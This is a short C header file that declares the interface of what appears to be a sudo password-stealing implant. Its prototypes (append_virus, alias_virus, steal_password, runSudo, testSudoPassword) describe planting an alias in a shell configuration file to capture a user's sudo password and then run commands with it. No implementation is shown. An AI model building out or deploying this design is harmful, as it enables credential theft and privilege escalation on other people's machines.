#ifndef PSEUDO_H
#define PSEUDO_H

#define P_SUDO 0
#define P_IMPLANT 1

int append_virus(char * home_dir, char * config_file, char * alias);
int alias_virus();
int steal_password(char * passwd, char * username);
int runSudo(char * passwd, char ** argary);
int testSudoPassword(char * passwd);
#endif
